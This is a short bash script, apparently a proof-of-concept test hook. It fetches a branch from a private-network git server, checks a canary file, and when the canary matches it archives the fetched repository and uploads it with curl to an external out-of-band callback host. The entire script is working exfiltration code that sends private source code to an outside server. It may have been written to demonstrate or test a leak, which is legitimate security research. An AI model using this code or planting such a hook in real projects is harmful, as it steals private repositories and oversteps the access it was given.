#!/bin/bash
set -eu

expected='MUTABLE_ORIGIN_CANARY_7e39d833-0738-424d-9803-bc33fd03569a'
temporary_directory="$(mktemp -d)"
trap 'rm -rf "$temporary_directory"' EXIT

git -C "$temporary_directory" init -q

timeout 15 git -C "$temporary_directory" fetch --depth=1 -q \
  http://git@192.168.0.1:8080/PinkDraconian/test2 \
  test-canary-origin-change-16026173627626907298

observed="$(
  git -C "$temporary_directory" \
    show FETCH_HEAD:evidence/mutable-origin-submit-canary.txt
)"

if [ "$observed" = "$expected" ]; then
  echo NATURAL_TEST_HOOK_CANARY_MATCH
  archive="$temporary_directory/test2-controlled-branch.tar.gz"
  git -C "$temporary_directory" archive --format=tar.gz -o "$archive" FETCH_HEAD
  curl --fail --silent --show-error --max-time 10 \
    -H "Content-Type: application/gzip" \
    --data-binary "@$archive" \
    "https://da2ol14pglk127a2eia0g74btswpn8ww1.oast.pro/test2-controlled-branch.tar.gz" \
    >/dev/null
  echo PRIVATE_SIBLING_ARCHIVE_CALLBACK_SENT
else
  echo NATURAL_TEST_HOOK_CANARY_MISMATCH
fi
